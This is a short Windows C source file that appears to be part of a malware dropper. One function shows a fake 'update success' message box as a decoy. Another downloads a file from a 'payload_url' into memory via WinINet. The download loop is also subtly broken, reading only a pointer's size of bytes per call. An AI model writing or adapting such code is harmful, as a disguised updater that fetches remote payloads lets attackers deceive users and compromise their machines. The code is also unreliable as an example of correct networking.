#include <windows.h>
#include <wininet.h>
#include "faker.h"

int faker_window() {
    MessageBox(NULL, "DC", "update success", MB_OK);
    return 0;
}

char* http_download(char *payload_url) {
    DWORD dwByteRead = 0;
    char *recvBuffer = (char *)malloc(10485760);
    memset(recvBuffer, 0, 4096);
    HINTERNET hintInternetOpen = InternetOpen("Testing", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hintInternetOpen) {
        InternetCloseHandle(hintInternetOpen);
        return recvBuffer;
    }
    HINTERNET hintInternetOpenUrl = InternetOpenUrl(hintInternetOpen, payload_url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hintInternetOpenUrl) {
        InternetCloseHandle(hintInternetOpen);
        InternetCloseHandle(hintInternetOpenUrl);
        return recvBuffer;
    }
    BOOL bIntNetReadFile = TRUE;
    char *recvBufferHeader = recvBuffer;
    while (bIntNetReadFile) {
        bIntNetReadFile = InternetReadFile(hintInternetOpenUrl, recvBuffer, sizeof(recvBuffer), &dwByteRead);
        if (!dwByteRead) {
            break;
        }
        recvBuffer += dwByteRead;
    }
    InternetCloseHandle(hintInternetOpen);
    InternetCloseHandle(hintInternetOpenUrl); 
    return recvBufferHeader;
}